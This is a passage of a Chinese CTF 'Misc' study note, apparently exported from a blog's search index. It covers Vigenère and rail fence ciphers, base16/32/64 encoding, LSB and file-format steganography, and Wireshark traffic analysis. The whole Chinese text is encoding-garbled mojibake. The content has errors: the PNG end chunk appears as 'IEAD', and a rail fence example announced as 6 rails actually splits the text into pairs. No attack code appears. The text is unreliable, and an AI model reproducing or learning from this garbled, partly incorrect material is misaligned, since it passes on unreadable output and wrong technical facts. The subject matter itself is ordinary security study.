åï¼Œæˆ‘ä»¬å¯ä»¥æŠŠAå’ŒBå½“ä½œä¸¤ä¸ªä¸åŒçš„ç‰¹å¾ï¼ˆå¦‚å¤§å†™&#x2F;å°å†™ï¼Œæ­£ä½“&#x2F;æ–œä½“ï¼‰å¸¦å…¥åˆ°ä¸€ä¸ª<em>æ— å…³çš„å¥å­</em>ä¸­ï¼Œ è¿™å°±å¾—åˆ°äº†æˆ‘ ä»¬åŠ å¯†åçš„ç»“æœã€‚ å…¶æœ¬è´¨ä¸Šæ˜¯å°†äºŒè¿›åˆ¶ä¿¡æ¯é€šè¿‡æ ·å¼çš„åŒºåˆ«ï¼ŒåŠ åœ¨äº†æ­£å¸¸ä¹¦å†™ä¹‹ä¸Šã€‚<br>![[Pasted image 20241024231439.png]]<br>ä¾‹å¦‚ï¼Œå‡è®¾æ˜æ–‡ä¸ºï¼šHEETIAN ç„¶åé€‰æ‹©æŸä¸€å…³é”®è¯å¹¶é‡å¤è€Œå¾—åˆ°å¯†é’¥ï¼Œå¦‚å…³é”®è¯ä¸ºLABæ—¶ï¼Œå¯†é’¥ä¸ºï¼šLABLABL å¯¹äºæ˜æ–‡çš„ç¬¬ä¸€ä¸ªå­—æ¯Hï¼Œå¯¹åº”å¯†é’¥çš„ç¬¬ä¸€ä¸ªå­—æ¯Lï¼Œäºæ˜¯ä½¿ç”¨è¡¨æ ¼ä¸­Lè¡Œå­—æ¯è¡¨è¿›è¡ŒåŠ å¯†ï¼Œå¾—åˆ°å¯†æ–‡ç¬¬ä¸€ä¸ªå­—æ¯Sã€‚ ç±»ä¼¼åœ°ï¼Œæ˜æ–‡ç¬¬äºŒä¸ªå­—æ¯ä¸ºEï¼Œåœ¨è¡¨æ ¼ä¸­ä½¿ç”¨å¯¹åº”çš„Aè¡Œè¿›è¡ŒåŠ å¯†ï¼Œå¾—åˆ°å¯†æ–‡ç¬¬äºŒä¸ªå­—æ¯Eã€‚ä»¥æ­¤ç±»æ¨ï¼Œå¯ä»¥å¾—åˆ°ï¼š æ˜æ–‡ï¼šHEETIAN å¯†é’¥ï¼šLABLABL å¯†æ–‡ï¼šSEFEIBY è§£å¯†çš„è¿‡ç¨‹åˆ™ä¸åŠ å¯†ç›¸åã€‚ ä¾‹å¦‚ï¼šæ ¹æ®å¯†é’¥ç¬¬ä¸€ä¸ªå­—æ¯Læ‰€å¯¹åº”çš„Lè¡Œå­—æ¯è¡¨ï¼Œå‘ç°å¯†æ–‡ç¬¬ä¸€ä¸ªå­—æ¯Sä½äºHåˆ—ï¼Œå› è€Œæ˜æ–‡ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºHã€‚ å¯†é’¥ç¬¬äºŒä¸ªå­—æ¯Aå¯¹åº”Aè¡Œå­—æ¯è¡¨ï¼Œè€Œå¯†æ–‡ç¬¬äºŒä¸ªå­—æ¯Eä½äºæ­¤è¡ŒEåˆ—ï¼Œå› è€Œæ˜æ–‡ç¬¬äºŒä¸ªå­—æ¯ä¸ºEã€‚ä»¥æ­¤ç±»æ¨ä¾¿å¯å¾—åˆ°æ˜æ–‡ã€‚</p><h3 id="æ …æ å¯†ç "><a href="#æ …æ å¯†ç " class="headerlink" title="æ …æ å¯†ç "></a>æ …æ å¯†ç </h3><p><strong>åŠ å¯†è¿‡ç¨‹</strong>ï¼šnæ …å¯†ç åˆ†nç»„ æŠŠæ¯ç»„ç¬¬ä¸€ä¸ªç¬¬äºŒä¸ªç­‰åˆ†åˆ«æ‹¿å‡ºæ¥å½¢æˆå¯†æ–‡</p><p> ä»¥2æ æ …æ å¯†ç ä¸ºä¾‹æ¥è®²è§£å®ƒçš„åŠ å¯†å’Œè§£å¯†è¿‡ç¨‹ã€‚ åŠ å¯†è¿‡ç¨‹ï¼š è§£å¯†è¿‡ç¨‹ï¼š é‚£ä¹ˆå¦‚ä½•å°†2æ å¯†ç æ‰©å±•åˆ°å¤šæ å‘¢ï¼Ÿåœ¨ä¹‹å‰çš„æ˜æ–‡ä¸­ï¼ŒCIPHERè¿™ä¸ªå•è¯ä¹‹ååŠ äº†ä¸€ä¸ªä¸‹åˆ’çº¿ï¼Œ ç›®çš„å°±æ˜¯ä¸ºäº†è®©æ˜æ–‡ å­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯2çš„å€æ•°ï¼Œ æ …æ å¯†ç çš„åˆ†æ çš„ä¸€ä¸ªå‰æå°±æ˜¯åˆ†çš„æ æ•°éœ€æ˜¯æ˜æ–‡é•¿åº¦çš„å› æ•°ï¼Œè¿™æ ·æ‰ä¼šä½¿å¾—åˆ†å‡ºæ¥çš„ æ¯ä¸ªæ é•¿åº¦éƒ½ä¸€æ ·ã€‚ å¯¹äºå¤šæ ï¼Œæˆ‘ä»¬è¿˜æ˜¯ç”¨ä¸Šé¢çš„ä¾‹å­æ¥è®²è§£ã€‚ ä¸Šé¢çš„æ˜æ–‡å­—ç¬¦ä¸²ï¼ˆTHERE_IS_A_CIPHER_ï¼‰çš„é•¿åº¦æ˜¯18 æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠå®ƒåˆ†ä¸º2ï¼Œ3ï¼Œ4ï¼Œ6ï¼Œ9æ ï¼Œè¿™é‡Œæˆ‘ä»¬ä»¥6æ ä¸ºä¾‹ã€‚ ä»¥æ¯ä¸ªå…ƒç´ ç›¸éš”6ä¸ªå­—ç¬¦åˆ†å‰²å‡ºæ …æ ã€‚ æ˜æ–‡ï¼šTHERE_IS_A_CIPHER_ ä¸¤ä¸ªä¸€ç»„ï¼Œå¾—åˆ°ï¼š(TH) (ER) (E_) (IS) (<em>A) (<em>C) (IP) (HE) (R</em>) å…ˆæ¯ç»„ä¸­å–å‡ºç¬¬ä¸€ä¸ªå­—æ¯ï¼šTEEI__IHR å†ä»æ¯ç»„ä¸­å–å‡ºç¬¬äºŒä¸ªå­—æ¯ï¼šHR_SACPE</em> è¿åœ¨ä¸€èµ·å¾—åˆ°å¯†æ–‡ï¼šTEEI__IHRHR_SACPE_ è€Œè§£å¯†çš„æ—¶å€™ï¼Œå…ˆæŠŠå¯†æ–‡ä»ä¸­é—´åˆ†å¼€ï¼Œå˜ä¸ºä¸¤è¡Œï¼š TEEI__IHR HR_SACPE_ å†æŒ‰ä¸Šä¸‹ä¸Šä¸‹çš„é¡ºåºç»„åˆèµ·æ¥ï¼š THERE_IS_A_CIPHER_</p><h3 id="å¸Œå°”å¯†ç "><a href="#å¸Œå°”å¯†ç " class="headerlink" title="å¸Œå°”å¯†ç "></a>å¸Œå°”å¯†ç </h3><p>[ASCIIç ](<a href="https://www.asciim.cn/">ASCIIç  - åŸºæœ¬ASCIIç å’Œæ‰©å±•ASCIIç ,ä¸­æ–‡æœ€å…¨ASCIIç å¯¹ç…§è¡¨0~255</a>)</p><h4 id="base16"><a href="#base16" class="headerlink" title="base16"></a>base16</h4><ol><li>ä½¿ç”¨åå…­ä¸ªå­—ç¬¦ï¼ˆ16è¿›åˆ¶ï¼‰0-9 A-F ä¸åŒºåˆ†å¤§å°å†™<br><strong>åŠ å¯†è¿‡ç¨‹</strong> æ ¹æ®ASCIIç è½¬æ¢ä¸ºäºŒè¿›åˆ¶ å››ä¸ªä¸€ç»„åˆ’åˆ† æ¯ç»„å†è½¬åŒ–ä¸º16è¿›åˆ¶</li></ol><h3 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h3><ol><li>32ä¸ªå¯æ‰“å°å­—ç¬¦ ï¼ˆA-Z 2-7ï¼‰</li><li>Base32ä¸»è¦ç”¨äºç¼–ç äºŒè¿›åˆ¶æ•°æ®ï¼Œä½†æ˜¯Base32ä¹Ÿèƒ½å¤Ÿç¼–ç è¯¸å¦‚ASCIIä¹‹ç±»çš„äºŒè¿›åˆ¶æ–‡æœ¬ã€‚<br><strong>åŠ å¯†è¿‡ç¨‹</strong> æ ¹æ®ASCIIç è½¬æ¢ä¸ºäºŒè¿›åˆ¶ äº”ä¸ªä¸€ç»„åˆ’åˆ†ï¼ˆä¸å¤Ÿè¡¥0ï¼‰ ä¸è¶³å››åå€æ•°è¡¥&#x3D;<br>ä¸€ä¸ª&#x3D;ç›¸å½“äºäº”ä¸ªå­—èŠ‚<br>![[Pasted image 20241024233351.png]]</li></ol><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p>64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼ˆa-z A-Z 0-9 + &#x2F;ï¼‰<br>æ ¹æ®ASCIIç è½¬æ¢ä¸ºäºŒè¿›åˆ¶ 6ä¸ªä¸€ç»„ä¸å¤Ÿè¡¥é›¶ æ•´ä½“ä¸å¤Ÿ24çš„å€æ•°è¡¥&#x3D; ä¸€ä¸ª&#x3D;ç›¸å½“äº6bit<br>![[Pasted image 20241024234013.png]]</p><p>åŒºåˆ†base16 base32 base64<br>æœ‰å°å†™base64<br>æœ‰ç­‰å·base32 base64</p><h1 id="MISC-éšå†™"><a href="#MISC-éšå†™" class="headerlink" title="MISC-éšå†™"></a>MISC-éšå†™</h1><p>åŸç†ï¼šæŠŠç§˜å¯†éšè—åˆ°æ™®é€šçš„ä¿¡æ¯ä¸­ï¼Œä½†æ˜¯ç›®å‰çš„éšå†™æœ¯æ˜¯å°†æŸäº›ç§˜å¯†ä¿¡æ¯éšè—äºæ•°å­—åª’ä»‹ä¸­ï¼Œè€Œåˆä¸æŸå®³è½½ä½“åŸæ¥ä¿¡æ¯çš„è¡¨è¾¾ï¼Œä»è€Œæ©ç›–ç§˜å¯†ä¿¡æ¯ã€‚å¸¸è§çš„éšå†™è½½ä½“åŒ…æ‹¬æ–‡æœ¬ï¼Œå›¾åƒï¼ŒéŸ³é¢‘ï¼Œè§†é¢‘ç­‰ã€‚æ¯”èµ›ä¸­ä¸»è¦è€ƒå¯Ÿä¸¤ç‚¹ï¼šéšå†™æ–¹æ³•çš„è¯†åˆ«å’Œä¿¡æ¯æå–ã€‚</p><h2 id="å›¾åƒéšå†™"><a href="#å›¾åƒéšå†™" class="headerlink" title="å›¾åƒéšå†™"></a>å›¾åƒéšå†™</h2><p>å¸¸è§çš„å›¾åƒéšå†™åˆ†ä¸ºä¸¤ç±»ï¼šæ’å…¥éšå†™å’Œæ›¿æ¢éšè—</p><p>æ’å…¥éšå†™ï¼šæŒ‡åˆ©ç”¨æ–‡ä»¶æ ¼å¼çš„å†—ä½™æ€§ï¼Œåœ¨ä¸å½±å“æ–‡ä»¶çš„æ­£å¸¸ä½¿ç”¨ä»è€Œéšè—ä¿¡æ¯ï¼Œè¿™ç§æ–¹æ³•ä¼šå¯¼è‡´æ–‡ä»¶çš„å¤§å°å‘ç”Ÿå˜åŒ–ï¼Œ<br>å°†1.jpgå’Œ1.zipè¿›è¡Œåˆå¹¶ä¹‹åï¼Œä»ç„¶å¾—åˆ°ä¸€ä¸ªå’Œ1.jpgâ€œä¸€æ‘¸ä¸€æ ·â€çš„å›¾ç‰‡ï¼Œä½†æ˜¯æˆ‘ä»¬æŸ¥çœ‹æ–‡ä»¶å¤§å°ä¹‹åå‘ç°ï¼Œå¤§å°æ­£å¥½æ˜¯ä¸¤è€…ä¹‹å’Œã€‚<br>æ›¿æ¢éšå†™ï¼ˆå¸¸è€ƒï¼‰ï¼šä¹Ÿå°±æ˜¯å°†å‡ ä¹ä¸å½±å“æ–‡ä»¶å†…å®¹çš„æ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œè¾¾åˆ°éšè—ä¿¡æ¯çš„ç›®çš„ï¼Œæœ€å¸¸è§çš„æ˜¯æœ€ä½æ¯”ç‰¹ä½éšå†™ï¼ˆLSBéšå†™ï¼‰ã€‚å› ä¸ºæœ‰æŸå‹ç¼©ä¼šæŸæ¯ä¿®æ”¹æ‰çš„å¾®å°ä¿¡æ¯</p><h4 id="LSBéšå†™ï¼šåœ¨å›¾åƒä¸­ï¼Œæ¯ä¸€ä¸ªé€šé“ç”±8æ¯”ç‰¹æ„æˆï¼Œåƒç´ å€¼åœ¨0-255ä¹‹é—´ï¼Œåœ¨å•é€šé“å›¾åƒä¸­ï¼Œé€šè¿‡ä¸åŒçš„é»‘ç™½æ¯”ä¾‹è¾¾åˆ°ä¸åŒçš„ç°åº¦ï¼Œä¸‰é€šé“å›¾åƒä¸­ï¼ˆRGBï¼‰ï¼Œæ¯ä¸ªé€šé“ä»£è¡¨çº¢ï¼Œç»¿ï¼Œè“ï¼Œåœ¨RGBAå›¾åƒä¸­ï¼Œå¤šå‡ºä¸€ä¸ªé€æ˜åº¦é€šé“ã€‚å› ä¸ºäºŒè¿›åˆ¶æ•°æ®çš„æœ€åä¸€ä½å¤§å°æ”¹å˜çš„å½±å“å¾ˆå°ï¼Œå°±å¯ä»¥åœ¨è¿™é‡Œæ›¿æ¢æ•°æ®ã€‚"><a href="#LSBéšå†™ï¼šåœ¨å›¾åƒä¸­ï¼Œæ¯ä¸€ä¸ªé€šé“ç”±8æ¯”ç‰¹æ„æˆï¼Œåƒç´ å€¼åœ¨0-255ä¹‹é—´ï¼Œåœ¨å•é€šé“å›¾åƒä¸­ï¼Œé€šè¿‡ä¸åŒçš„é»‘ç™½æ¯”ä¾‹è¾¾åˆ°ä¸åŒçš„ç°åº¦ï¼Œä¸‰é€šé“å›¾åƒä¸­ï¼ˆRGBï¼‰ï¼Œæ¯ä¸ªé€šé“ä»£è¡¨çº¢ï¼Œç»¿ï¼Œè“ï¼Œåœ¨RGBAå›¾åƒä¸­ï¼Œå¤šå‡ºä¸€ä¸ªé€æ˜åº¦é€šé“ã€‚å› ä¸ºäºŒè¿›åˆ¶æ•°æ®çš„æœ€åä¸€ä½å¤§å°æ”¹å˜çš„å½±å“å¾ˆå°ï¼Œå°±å¯ä»¥åœ¨è¿™é‡Œæ›¿æ¢æ•°æ®ã€‚" class="headerlink" title="LSBéšå†™ï¼šåœ¨å›¾åƒä¸­ï¼Œæ¯ä¸€ä¸ªé€šé“ç”±8æ¯”ç‰¹æ„æˆï¼Œåƒç´ å€¼åœ¨0~255ä¹‹é—´ï¼Œåœ¨å•é€šé“å›¾åƒä¸­ï¼Œé€šè¿‡ä¸åŒçš„é»‘ç™½æ¯”ä¾‹è¾¾åˆ°ä¸åŒçš„ç°åº¦ï¼Œä¸‰é€šé“å›¾åƒä¸­ï¼ˆRGBï¼‰ï¼Œæ¯ä¸ªé€šé“ä»£è¡¨çº¢ï¼Œç»¿ï¼Œè“ï¼Œåœ¨RGBAå›¾åƒä¸­ï¼Œå¤šå‡ºä¸€ä¸ªé€æ˜åº¦é€šé“ã€‚å› ä¸ºäºŒè¿›åˆ¶æ•°æ®çš„æœ€åä¸€ä½å¤§å°æ”¹å˜çš„å½±å“å¾ˆå°ï¼Œå°±å¯ä»¥åœ¨è¿™é‡Œæ›¿æ¢æ•°æ®ã€‚"></a>LSBéšå†™ï¼šåœ¨å›¾åƒä¸­ï¼Œæ¯ä¸€ä¸ªé€šé“ç”±8æ¯”ç‰¹æ„æˆï¼Œåƒç´ å€¼åœ¨0~255ä¹‹é—´ï¼Œåœ¨å•é€šé“å›¾åƒä¸­ï¼Œé€šè¿‡ä¸åŒçš„é»‘ç™½æ¯”ä¾‹è¾¾åˆ°ä¸åŒçš„ç°åº¦ï¼Œä¸‰é€šé“å›¾åƒä¸­ï¼ˆRGBï¼‰ï¼Œæ¯ä¸ªé€šé“ä»£è¡¨çº¢ï¼Œç»¿ï¼Œè“ï¼Œåœ¨RGBAå›¾åƒä¸­ï¼Œå¤šå‡ºä¸€ä¸ªé€æ˜åº¦é€šé“ã€‚å› ä¸ºäºŒè¿›åˆ¶æ•°æ®çš„æœ€åä¸€ä½å¤§å°æ”¹å˜çš„å½±å“å¾ˆå°ï¼Œå°±å¯ä»¥åœ¨è¿™é‡Œæ›¿æ¢æ•°æ®ã€‚</h4><p>æ¯ä¸€ä¸ªè‰²ç´ éƒ½ç”±RGBï¼ˆçº¢ç»¿è“ï¼‰ä¸‰ç§é¢œè‰²ç»„æˆï¼Œæ¯ç§é¢œè‰²çš„å æ¯”ä¸åŒï¼Œæ‰€è°ƒå‡ºæ¥çš„é¢œè‰²ä¸åŒã€‚çº¢218ï¼ˆ11011010ï¼‰ï¼Œç»¿150ï¼ˆ10010110ï¼‰ï¼Œçº¢ï¼ˆ10010101ï¼‰ï¼Œå‡å¦‚æ”¹å˜æ¯ç§é¢œè‰²äºŒè¿›åˆ¶æ•°å­—çš„æœ€åä¸€ä½ï¼Œå¯¹äºæ•´ä½“çš„é¢œè‰²æ”¹å˜ï¼Œ è‚‰çœ¼å¹¶ä¸èƒ½è§‚å¯Ÿå‡ºæ¥ï¼Œä»è€Œè¾¾åˆ°éšè—ä¿¡æ¯çš„ç›®çš„</p><h3 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h3><p>PNGå›¾ç‰‡ï¼ˆæ— æŸå‹ç¼©ï¼‰<br>PNGå›¾ç‰‡æ–‡ä»¶å¤´çš„16è¿›åˆ¶è¡¨ç¤ºï¼š89 50 4E 47<br>ä¸€ä¸ªpngå›¾ç‰‡çš„æ•°æ®å¯ä»¥åˆ†ä¸ºå¤šä¸ªæ•°æ®å—ã€‚</p><p>æˆ‘ä»¬ä¹‹æ‰€ä»¥èƒ½çœ‹åˆ°å›¾ç‰‡ï¼Œå°±æ˜¯å› ä¸ºå›¾ç‰‡æŸ¥çœ‹å™¨å°†å›¾ç‰‡æ‰€å¯¹åº”çš„äºŒè¿›åˆ¶å­—èŠ‚æµæŒ‰ç…§å®ƒçš„è§£é‡Šè§„åˆ™å°†å›¾ç‰‡è½¬æ¢ä¸ºè‰²ç´ å—ï¼Œåˆ†æä¸€ä¸ªå›¾ç‰‡é€šå¸¸æ˜¯æŸ¥çœ‹å®ƒçš„åŸå§‹äºŒè¿›åˆ¶å­—èŠ‚æµ</p><ol><li><p>IHDRæ•°æ®å—ï¼šæ–‡ä»¶å¤´æ•°æ®å—ï¼Œé€šå¸¸åŒ…å«å›¾ç‰‡çš„é«˜åº¦å’Œå®½åº¦ç­‰åŸºæœ¬å±æ€§ï¼Œå¯ä»¥é€šè¿‡å°†crcè¿˜åŸå‡ºæ¥æ‰€å¯¹åº”çš„&#x3D;&#x3D;é«˜åº¦&#x3D;&#x3D;å’Œ&#x3D;&#x3D;å®½åº¦&#x3D;&#x3D;æ¥æ‰¾åˆ°flagã€‚<br> ![[Pasted image 20241027121726.png]]</p></li><li><p>cHRMæ•°æ®å—ã€‚</p></li><li><p>IDATæ•°æ®å—ï¼ˆå¤šä¸ªï¼‰ï¼ˆåŒ…å«å›¾ç‰‡å†…å®¹ï¼‰ï¼šåŒ…å«äº†æ•°æ®çš„æ„æˆå‚æ•°ã€‚å¦‚æœè¯¥æ•°æ®å—æœ‰é—®é¢˜ï¼Œæœ‰ä¸€ç§é¢˜å‹æ˜¯åœ¨è¯¥æ•°æ®å—ä¸­å­˜æœ‰å‹ç¼©åŒ…ï¼Œé€šè¿‡Zlibå·¥å…·è§£å‹ç¼©æŸ¥çœ‹å†…å®¹ã€‚</p></li><li><p>IEADæ•°æ®å—ï¼šå›¾ç‰‡ç»“æŸæ ‡å¿—ã€‚</p></li></ol><h3 id="JPG-ï¼ˆæœ‰æŸæˆ–è€…æ— æŸï¼‰"><a href="#JPG-ï¼ˆæœ‰æŸæˆ–è€…æ— æŸï¼‰" class="headerlink" title="JPG ï¼ˆæœ‰æŸæˆ–è€…æ— æŸï¼‰"></a>JPG ï¼ˆæœ‰æŸæˆ–è€…æ— æŸï¼‰</h3><p>JPGå›¾ç‰‡ï¼ˆç”±ä¸€ä¸ªä¸€ä¸ªæ®µç»„æˆï¼‰</p><p>æ–‡ä»¶å¤´è¯†åˆ«ï¼šFFD8</p><h3 id="GIFï¼ˆæ— æŸï¼‰"><a href="#GIFï¼ˆæ— æŸï¼‰" class="headerlink" title="GIFï¼ˆæ— æŸï¼‰"></a>GIFï¼ˆæ— æŸï¼‰</h3><p>GIFå›¾ç‰‡æ–‡ä»¶å¤´ï¼šGIF89a&#x2F;GIF87a</p><h1 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h1><p><strong>æµé‡æ•è·</strong> é€šå¸¸é¢˜ç›®ä¼šæä¾›ä¸€ä¸ª .pcap æ–‡ä»¶ï¼Œå®ƒæ˜¯ç½‘ç»œæ•°æ®åŒ…çš„æ•è·æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ†æå…¶ä¸­çš„æµé‡æ•°æ®ã€‚<br>æµé‡åˆ†æçš„å¸¸è§æµç¨‹</p><ol><li>åˆæ­¥æ£€æŸ¥æµé‡æ–‡ä»¶ ä½¿ç”¨Wiresharkæ‰“å¼€ </li><li>åè®®è¯†åˆ«ä¸åˆ†æ .pcap æ–‡ä»¶ï¼ŒæŸ¥çœ‹æµé‡æ€»é‡ã€åè®®ç±»å‹</li><li>æŸ¥æ‰¾æœ€å¤šæˆ–è€…æœ€å°‘æµé‡ã€‚ </li><li>ç­›é€‰å’Œè¿‡æ»¤æ•°æ®åŒ… ä½¿ç”¨Wiresharkçš„è¿‡æ»¤å™¨åŠŸèƒ½ï¼Œé€æ­¥ç¼©å°æ„Ÿå…´è¶£çš„èŒƒå›´ã€‚æ¯”å¦‚ï¼ŒHTTPæµé‡çš„è¿‡æ»¤æ¡ä»¶ æ˜¯httpï¼ŒDNSæ˜¯ dns ï¼Œé€šè¿‡æº&#x2F;ç›®çš„IPã€ç«¯å£ç­‰è¿›ä¸€æ­¥è¿‡æ»¤ã€‚</li><li>æŸ¥æ‰¾æ•°æ®æµ</li></ol><p>æœç´¢æ ¼å¼ä¸ºframe contains â€œ â€œ<br>Liunxç³»ç»Ÿä¸‹é…ç½®æ–‡ä»¶æ”¾åœ¨etcç›®å½• ä¸‹ï¼Œ</p>]]></content>
    
    
    <categories>
      
      <category>åŸºç¡€çŸ¥è¯†</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¼–ç è§£ç </tag>
      
      <tag>å›¾ç‰‡éšå†™</tag>
      
      <tag>LSBéšå†™</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
